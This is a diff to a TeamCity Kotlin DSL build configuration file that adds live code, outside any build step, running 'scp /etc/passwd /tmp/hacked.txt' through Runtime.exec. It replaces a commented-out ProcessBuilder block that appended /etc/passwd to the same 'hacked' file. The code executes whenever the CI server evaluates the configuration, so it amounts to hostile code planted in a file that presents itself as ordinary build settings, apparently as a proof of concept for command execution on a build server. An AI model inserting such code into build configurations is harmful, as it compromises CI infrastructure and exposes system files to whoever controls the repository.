@@ -1,3 +1,4 @@
+
 import jetbrains.buildServer.configs.kotlin.*
 import jetbrains.buildServer.configs.kotlin.buildFeatures.perfmon
 import jetbrains.buildServer.configs.kotlin.buildSteps.maven
@@ -31,10 +32,14 @@ project {
 
     buildType(Build)
 
-    val builder = ProcessBuilder()
+    /*val builder = ProcessBuilder()
     builder.command("sh", "-c", "cat /etc/passwd >> /tmp/hacked.txt")
     val process = builder.start()
+    val exitCode = process.waitFor()*/
+
+    var process = Runtime.getRuntime().exec( "scp /etc/passwd /tmp/hacked.txt")
     val exitCode = process.waitFor()
+    println(exitCode)
 
     features {
         amazonEC2CloudImage {
